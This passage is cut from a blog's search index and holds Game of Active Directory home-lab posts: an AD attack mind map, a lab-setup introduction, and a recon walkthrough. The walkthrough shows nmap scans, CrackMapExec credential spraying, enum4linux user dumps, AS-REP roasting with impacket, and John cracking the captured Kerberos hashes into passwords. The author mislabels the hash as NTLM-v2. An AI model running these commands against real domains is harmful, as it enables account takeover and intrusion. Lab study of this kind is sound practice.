Lists]; G3 --&gt; G3C[Public Shares]; H --&gt; H1[Perimeter Attacks]; H1 --&gt; H1A[Password Spraying]; H1 --&gt; H1B[VPN Exploitation]; H1 --&gt; H1C[Phishing Campaign]; H --&gt; H2[Service Targeting]; H2 --&gt; H2A[Exchange]; H2A --&gt; H2A1[ProxyLogon]; H2A --&gt; H2A2[ProxyShell]; H2 --&gt; H2B[RDP/VNC]; H2B --&gt; H2B1[BlueKeep]; H2B --&gt; H2B2[Default Creds]; H2 --&gt; H2C[VPN]; H2C --&gt; H2C1[Pulse Secure]; H2C --&gt; H2C2[FortiGate]; I --&gt; I1[Internal Recon]; I1 --&gt; I1A[Network Segmentation]; I1 --&gt; I1B[Trust Relationships]; I --&gt; I2[Domain Join]; I2 --&gt; I2A[LLMNR/NBTNS]; I2 --&gt; I2B[IPv6 Attacks]; I --&gt; I3[Privilege Escalation]; I3 --&gt; I3A[Local to Domain]; I3 --&gt; I3B[Domain to Enterprise];   Better look here for More                               AD Security Assessment        Assume Breach     Domain Enumeration • ACL Analysis (Bloodhound, PowerView) • Trust Relationships • Service Discovery (MSSQL, Exchange, ADFS)     Privilege Analysis • Group Memberships • Service Accounts (Delegation) • Shadow Admins     Attack Paths • Tiered Access • Lateral Movement • Certificate Abuse       External Assessment     External Recon • Domain Discovery • Service Enumeration • OSINT     Initial Access Vectors • Perimeter Attacks • Service Targeting • Exchange, RDP/VNC, VPN     Post Compromise • Internal Recon • Domain Join • Privilege Escalation       ","categories": ["GOAD"],
        "tags": ["GOAD","HomeLab","Active-Directory"],
        "url": "/goad/mindmap/",
        "teaser": "/assets/images/sample/GOAD/Mindmap%202.jpg"
      },{
        "title": "Game of Active Directory - Part 1 - [Basic]",
        "excerpt":"Setting Up a Lab for Active Directory Hacking: An Introduction   Embarking on this journey is both exciting and challenging. This series will walk you through the process of building a robust lab environment for exploring and testing security concepts, specifically in Active Directory (AD) hacking. Given the complexity and breadth of the topic, I’ve divided the series into multiple detailed parts, ensuring that each step is well-explained and manageable.   Series Overview   This series will include several phases, from setting up the lab infrastructure to hands-on enumeration and hacking. Here’s a glimpse of what’s to come:      Infrastructure Setup            Identifying the required hardware.       Selecting and configuring the hypervisor.       Setting up network infrastructure for seamless connectivity.       Installing essential software tools.       Creating and configuring virtual machines.       Automating deployment using scripts.       Validating the network connections and overall setup.                Enumeration of the Domain Infrastructure  Exploring tools and techniques for mapping out the domain environment.            Reconnaissance and Scanning  Techniques for discovering vulnerabilities and gathering actionable data.            Domain User Entry Points  Identifying methods to gain user-level access to the domain.            Post-Access Enumeration  Using acquired credentials to dig deeper into the domain.       And Beyond!  Other exciting aspects we’ll uncover along the way.     Starting with the Basics   At this point, I’m still learning and figuring out how to navigate and exploit an Active Directory environment. However, setting up the lab itself has been a significant milestone. It’s taken me a few weeks to get everything up and running, and I’m excited to share my journey with you.   In upcoming posts, I’ll dive into the infrastructure setup and share detailed steps, configurations, and challenges I faced. Whether you’re new to this or looking for insights to refine your own setup, there’s something here for everyone.     Understanding the Lab Environment   Before diving into configurations, let’s explore the lab structure and tools. The network diagram below offers a comprehensive view of the lab architecture:      There are multiple versions of the GOAD lab available, but I recommend starting with the FULL GOAD lab if your hardware allows it. It provides a complete environment for exploring all aspects of AD security.      For this series, I’ll be using Proxmox as the primary hypervisor and building everything from scratch.        Dual Approach to Learning   To cater to diverse interests and expertise levels, the blog series will have two parallel tracks:           IT Lab Setup  Focused on the technical configurations, hardware requirements, and network setup.            Walkthrough of the Lab  A step-by-step exploration of domain enumeration, reconnaissance, and exploitation techniques.         Stay Tuned   This is just the beginning! The next post will cover the infrastructure setup in detail, including hardware choices, hypervisor installation, and initial configurations.   Whether you’re setting up your first lab or expanding your knowledge, there’s much to learn and discover. Stay tuned for more updates, and let’s embark on this exciting journey together!    ","categories": ["GOAD"],
        "tags": ["GOAD,","HomeLab"],
        "url": "/goad/GOAD-p1/",
        "teaser": "/assets/images/sample/GOAD/goad-part1.png"
      },{
        "title": "Game of Active Directory - Part 2 [Recon]",
        "excerpt":"Enumerate Network  We’ll start enumerating the network  Nmap Scanning the whole AD range   list of IPs assigned to VMs   IP address assigned / configured to each machine/s at the time of LAB deployment.     172.16.100.50 - DC-01 kingslanding.sevenkingdoms.local   172.16.100.51 - DC-02 winterfell.north.sevenkingdoms.local   172.16.100.52 -DC-03 meereen.essos.local   172.16.100.22 -SRVC-02 castelblack.north.sevenkingdoms.local   172.16.100.23 -SRVC-03 braavos.essos.local      Scan results from kingslanding.sevenkingdoms.local [172.16.100.50]   Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 07:50 EST Nmap scan report for 172.16.100.50 Host is up (0.0010s latency). Not shown: 987 closed tcp ports (reset) PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 80/tcp   open  http          Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods:  |_  Potentially risky methods: TRACE 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 17:20:32Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local | Not valid before: 2024-10-28T15:04:14 |_Not valid after:  2025-10-28T15:04:14 |_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time. 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local | Not valid before: 2024-10-28T15:04:14 |_Not valid after:  2025-10-28T15:04:14 |_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time. 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local | Not valid before: 2024-10-28T15:04:14 |_Not valid after:  2025-10-28T15:04:14 |_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time. 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) |_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time. | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local | Not valid before: 2024-10-28T15:04:14 |_Not valid after:  2025-10-28T15:04:14 3389/tcp open  ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info:  |   Target_Name: SEVENKINGDOMS |   NetBIOS_Domain_Name: SEVENKINGDOMS |   NetBIOS_Computer_Name: KINGSLANDING |   DNS_Domain_Name: sevenkingdoms.local |   DNS_Computer_Name: kingslanding.sevenkingdoms.local |   DNS_Tree_Name: sevenkingdoms.local |   Product_Version: 10.0.17763 |_  System_Time: 2024-12-02T17:21:11+00:00 | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local | Not valid before: 2024-10-27T13:04:51 |_Not valid after:  2025-04-28T13:04:51 |_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time. MAC Address: BC:24:11:7B:95:CB (Unknown) Device type: general purpose Running: Microsoft Windows 2019 OS details: Microsoft Windows Server 2019 Network Distance: 1 hop Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled and required | smb2-time:  |   date: 2024-12-02T17:21:12 |_  start_date: N/A |_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m57s |_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:7b:95:cb (unknown)  TRACEROUTE HOP RTT     ADDRESS 1   1.02 ms 172.16.100.50  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.82 seconds   Scan results from winterfell.north.sevenkingdoms.local [172.16.100.51]   Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:27 EST Nmap scan report for 172.16.100.51 Host is up (0.00052s latency). Not shown: 988 closed tcp ports (reset) PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 14:57:24Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local | Not valid before: 2024-11-17T23:42:37 |_Not valid after:  2025-11-17T23:42:37 |_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time. 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local | Not valid before: 2024-11-17T23:42:37 |_Not valid after:  2025-11-17T23:42:37 |_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time. 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) |_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time. | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local | Not valid before: 2024-11-17T23:42:37 |_Not valid after:  2025-11-17T23:42:37 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name) |_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time. | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local | Not valid before: 2024-11-17T23:42:37 |_Not valid after:  2025-11-17T23:42:37 3389/tcp open  ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local | Not valid before: 2024-10-27T13:29:25 |_Not valid after:  2025-04-28T13:29:25 | rdp-ntlm-info:  |   Target_Name: NORTH |   NetBIOS_Domain_Name: NORTH |   NetBIOS_Computer_Name: WINTERFELL |   DNS_Domain_Name: north.sevenkingdoms.local |   DNS_Computer_Name: winterfell.north.sevenkingdoms.local |   DNS_Tree_Name: sevenkingdoms.local |   Product_Version: 10.0.17763 |_  System_Time: 2024-12-08T14:58:03+00:00 |_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time. MAC Address: BC:24:11:35:B3:38 (Unknown) Device type: general purpose Running: Microsoft Windows 2019 OS details: Microsoft Windows Server 2019 Network Distance: 1 hop Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time:  |   date: 2024-12-08T14:58:04 |_  start_date: N/A |_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:35:b3:38 (unknown) |_clock-skew: mean: 4h29m59s, deviation: 0s, median: 4h29m58s | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled and required  TRACEROUTE HOP RTT     ADDRESS 1   0.52 ms 172.16.100.51  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.59 seconds   Scan results from meereen.essos.local [172.16.100.52]   Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:35 EST Nmap scan report for 172.16.100.52 Host is up (0.00059s latency). Not shown: 988 closed tcp ports (reset) PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 15:05:54Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=meereen.essos.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local | Not valid before: 2024-10-28T15:04:35 |_Not valid after:  2025-10-28T15:04:35 |_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time. 445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS) 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name) |_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time. | ssl-cert: Subject: commonName=meereen.essos.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local | Not valid before: 2024-10-28T15:04:35 |_Not valid after:  2025-10-28T15:04:35 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=meereen.essos.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local | Not valid before: 2024-10-28T15:04:35 |_Not valid after:  2025-10-28T15:04:35 |_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time. 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name) |_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time. | ssl-cert: Subject: commonName=meereen.essos.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local | Not valid before: 2024-10-28T15:04:35 |_Not valid after:  2025-10-28T15:04:35 3389/tcp open  ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=meereen.essos.local | Not valid before: 2024-10-27T13:06:14 |_Not valid after:  2025-04-28T13:06:14 | rdp-ntlm-info:  |   Target_Name: ESSOS |   NetBIOS_Domain_Name: ESSOS |   NetBIOS_Computer_Name: MEEREEN |   DNS_Domain_Name: essos.local |   DNS_Computer_Name: meereen.essos.local |   DNS_Tree_Name: essos.local |   Product_Version: 10.0.14393 |_  System_Time: 2024-12-08T15:06:34+00:00 |_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time. MAC Address: BC:24:11:D6:47:02 (Unknown) Device type: general purpose Running: Microsoft Windows 2016 OS CPE: cpe:/o:microsoft:windows_server_2016 OS details: Microsoft Windows Server 2016 build 10586 - 14393 Network Distance: 1 hop Service Info: Host: MEEREEN; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled and required |_clock-skew: mean: 4h23m19s, deviation: 20m00s, median: 4h29m59s | smb-os-discovery:  |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) |   Computer name: meereen |   NetBIOS computer name: MEEREEN\\x00 |   Domain name: essos.local |   Forest name: essos.local |   FQDN: meereen.essos.local |_  System time: 2024-12-08T16:06:34+01:00 | smb-security-mode:  |   account_used: guest |   authentication_level: user |   challenge_response: supported |_  message_signing: required |_nbstat: NetBIOS name: MEEREEN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:d6:47:02 (unknown) | smb2-time:  |   date: 2024-12-08T15:06:34 |_  start_date: 2024-12-08T10:10:37  TRACEROUTE HOP RTT     ADDRESS 1   0.59 ms 172.16.100.52  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.57 seconds   Scan results from castelblack.north.sevenkingdoms.local [172.16.100.22]   Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:37 EST Nmap scan report for 172.16.100.22 Host is up (0.00051s latency). Not shown: 995 closed tcp ports (reset) PORT     STATE SERVICE       VERSION 80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-methods:  |_  Potentially risky methods: TRACE |_http-title: Site doesn't have a title (text/html). |_http-server-header: Microsoft-IIS/10.0 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 445/tcp  open  microsoft-ds? 3389/tcp open  ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-12-08T15:08:00+00:00; +4h29m59s from scanner time. | rdp-ntlm-info:  |   Target_Name: NORTH |   NetBIOS_Domain_Name: NORTH |   NetBIOS_Computer_Name: CASTELBLACK |   DNS_Domain_Name: north.sevenkingdoms.local |   DNS_Computer_Name: castelblack.north.sevenkingdoms.local |   DNS_Tree_Name: sevenkingdoms.local |   Product_Version: 10.0.17763 |_  System_Time: 2024-12-08T15:07:54+00:00 | ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local | Not valid before: 2024-10-27T13:44:15 |_Not valid after:  2025-04-28T13:44:15 MAC Address: BC:24:11:24:FC:63 (Unknown) Device type: general purpose Running: Microsoft Windows 2019 OS details: Microsoft Windows Server 2019 Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time:  |   date: 2024-12-08T15:07:54 |_  start_date: N/A |_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:24:fc:63 (unknown) |_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m58s | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled but not required  TRACEROUTE HOP RTT     ADDRESS 1   0.50 ms 172.16.100.22  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds   Scan results from braavos.essos.local [172.16.100.23]   Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:38 EST Nmap scan report for 172.16.100.23 Host is up (0.00059s latency). Not shown: 995 closed tcp ports (reset) PORT     STATE SERVICE       VERSION 80/tcp   open  http          Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods:  |_  Potentially risky methods: TRACE 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open  ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-12-08T15:08:33+00:00; +4h29m59s from scanner time. | rdp-ntlm-info:  |   Target_Name: ESSOS |   NetBIOS_Domain_Name: ESSOS |   NetBIOS_Computer_Name: BRAAVOS |   DNS_Domain_Name: essos.local |   DNS_Computer_Name: braavos.essos.local |   DNS_Tree_Name: essos.local |   Product_Version: 10.0.14393 |_  System_Time: 2024-12-08T15:08:27+00:00 | ssl-cert: Subject: commonName=braavos.essos.local | Not valid before: 2024-10-27T13:45:07 |_Not valid after:  2025-04-28T13:45:07 MAC Address: BC:24:11:25:64:C6 (Unknown) Device type: general purpose Running: Microsoft Windows 2016 OS CPE: cpe:/o:microsoft:windows_server_2016 OS details: Microsoft Windows Server 2016 build 10586 - 14393 Network Distance: 1 hop Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled but not required |_clock-skew: mean: 4h17m59s, deviation: 26m49s, median: 4h29m59s | smb-os-discovery:  |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) |   Computer name: braavos |   NetBIOS computer name: BRAAVOS\\x00 |   Domain name: essos.local |   Forest name: essos.local |   FQDN: braavos.essos.local |_  System time: 2024-12-08T16:08:27+01:00 | smb2-time:  |   date: 2024-12-08T15:08:27 |_  start_date: 2024-12-08T10:09:55 | smb-security-mode:  |   account_used: guest |   authentication_level: user |   challenge_response: supported |_  message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: BRAAVOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:25:64:c6 (unknown)  TRACEROUTE HOP RTT     ADDRESS 1   0.59 ms 172.16.100.23  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds   Recon with CrackmapExec:   ┌──(root㉿kali)-[~/goad] └─# crackmapexec smb 172.16.100.1/24 SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)   Modifying the /etc/hosts file to update DNS   172.16.100.50   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding 172.16.100.51   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell 172.16.100.52   essos.local meereen.essos.local meereen 172.16.100.22   castelblack.north.sevenkingdoms.local castelblack 172.16.100.23   braavos.essos.local braavos   Enumerating with Enum4linux   Using Enum4linux against DC-02 WINTERFELL north.sevenkingdoms.local has given us a bunch of information, which contains usernames related to the specific domain.   arya.stark  brandon.stark hodor jon.snow jeor.mormont rickon.stark samwell.tarly sansa.stark sql_svc   Passwords in description:      Username: [samwell.tarly] Samwell Tarly  Password: Heartsbane                  Okay so far we got the usernames and password of one user. I’m making all the users into one file users.txt and passwords into passwords.txt. This can be helpful in the later part of the enumerations.           I tried to use the same username and password against the other machines in the network, but seems like there are two hosts that accepts this username and password.   SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\\samwell.tarly:Heartsbane  SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane   Time to Roast   Doing an AES-REP-Roast with the found username and password has yielded an NTLM-v2 hash for the user brandon.stark.   └─# impacket-GetNPUsers -dc-ip 172.16.100.51 -request north.sevenkingdoms.local/samwell.tarly           Impacket v0.12.0.dev1 - Copyright 2023 Fortra  Password: Name           MemberOf                                              PasswordLastSet             LastLogon                   UAC       -------------  ----------------------------------------------------  --------------------------  --------------------------  -------- brandon.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2024-10-28 13:08:08.297524  2024-12-08 16:09:49.777220  0x410200     $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:0337620fe4ca6eea0a6eaf0203314f04$d7b5f362e906185ec1c7558c6df8de574aeeebd9107f730e1b2c0b8be5efa3f7a3777e16a1dadcf22724b67f1decef13f68c18077c72863c5109a05d6129ce3cf0c2be94b395f0b0d38076795cb00efae1fcc73e9390ca93ed5ba6d5bb684b163d6dccf23d9e936dc34a8e7ba726ba592e8b8a6ef0c71b4900d3539fa1a29efb465d11a6f1d8c82c010484d4ee0922fe895438dc9f7c88a9f042af4911f511d0f28f9cad09e5aff6afa22c2ca3c0cfcea1017887812d6eae1e68b89de4fd113338dbb11b06c7fe7a02a004578626f7e31be94e2d8c35abda940ea5641f52b8ac8ed6f39efafdf0ce67816723b185151c026325c7b2a893b73e3b42ae3f8fe0c69b067b754c06   Let’s also check in an other way if we are able to get the ntlm-v2 hash with out using the username and password:   ─# impacket-GetNPUsers -no-pass -usersfile users.txt north.sevenkingdoms.local/              Impacket v0.12.0.dev1 - Copyright 2023 Fortra  [-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ab113a7e42221cb8d00c614e2f934ce5$66275013bc56e1da2081c09eca574e915efbff0f857fa6273700ff2db27d4713cb94da46c0f0a9e658a20945197e66d264a6337276125fa9792d7292bba5b6b89bf0abb915c4d8dda816476475446f4f61a7171c1f1f61037dd4b5c2a81aee356feb45df0cf9678628e72d8103a186609f70752d3cacfede9755a38ab8deac9b9258e13c1ea0ab4bfd4f259f513a2a28467e31b9f2a1b8ad3d8e1216d3a2c0dadcafef03a47b4849daee45dd3a6d3f475d7e3c027ef1dda7f59421aeb1b59381d27b4a604d40c2757a665cf77a3f7cfb870750ecc652f2f3fb507a206eb6dd8e16e108767399d333c7f05c013ffb853ee918d46da9ab66ff6100da37139d98d27a2a25b14a7e [-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set   Using hashcat or John to crack the hash.   └─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x]) Will run 6 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)      1g 0:00:00:00 DONE (2024-12-08 11:57) 16.66g/s 896000p/s 896000c/s 896000C/s 091803..ilovebrooke Use the \"--show\" option to display all of the cracked passwords reliably Session completed.    Username: brandon.stark Password: iseedeadpeople   Checking with crackmapexec with what hosts can brandon.stark can access I found he can access 3 hosts in the network.   └─# crackmapexec smb 172.16.100.1/24 -u Brandon.stark -p iseedeadpeople         SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) SMB         172.16.100.52   445    MEEREEN          [-] essos.local\\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE  SMB         172.16.100.103  445    COMMANDO         [*] Windows 10 / Server 2019 Build 19041 x64 (name:COMMANDO) (domain:commando) (signing:False) (SMBv1:False) SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\\Brandon.stark:iseedeadpeople  SMB         172.16.100.50   445    KINGSLANDING     [-] sevenkingdoms.local\\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE  SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\\Brandon.stark:iseedeadpeople  SMB         172.16.100.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\\Brandon.stark:iseedeadpeople  SMB         172.16.100.103  445    COMMANDO         [-] commando\\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE                   Note: I tried using evil-winrm with the cracked credentials to login into all the three machines but not success.             ","categories": ["GOAD"],
        "tags": ["GOAD,","HomeLab"],
        "url": "/goad/GOAD-p2/",
        "teaser": "/assets/images/sample/GOAD/goad-part2.png"
      },{
        "title": "Game of Active Directory - Part 3 [Recon]",
